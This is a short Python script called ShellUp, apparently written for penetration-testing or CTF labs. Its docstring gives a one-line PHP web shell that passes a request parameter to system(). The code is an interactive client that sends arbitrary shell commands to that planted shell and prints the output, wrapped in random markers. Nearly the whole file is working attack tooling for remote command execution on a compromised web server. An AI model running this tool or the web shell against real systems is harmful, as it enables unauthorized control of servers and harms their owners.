#!/usr/bin/env python3
"""
	ShellUp is a means to communicate with a php script without having to
	open up burp suite to issue commands.

	It assumes the following is in place on whatever php script you were able to write:

	<?php system($_REQUEST['cmd']); ?>
"""

import requests
import random
import string
import cmd

target = "http://10.10.X.X/temp.php"
target_param = "cmd"

def randomString(stringLength=20):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

def invoke_command(url, php_param, cmd):
	"""
	connects to the URL, sends a message through the PHP parameter
	"""

	rstring = randomString()
	prefix = f"{rstring}_BEGIN"
	suffix = f"{rstring}_END"

	wrapped_command = f"echo -n {prefix}; {cmd} ; echo -n {suffix}"
	payload = { php_param: wrapped_command }
	r = requests.get(url, params=payload)
	if prefix in r.text:
		split_left, split_right = r.text.split(prefix)
		content, split_remainder = split_right.split(suffix)
		return content

	return None

class Terminal(cmd.Cmd):
	prompt = "Command => "

	def default(self, args):
		print(invoke_command(target, target_param, args))

term = Terminal()
term.cmdloop()
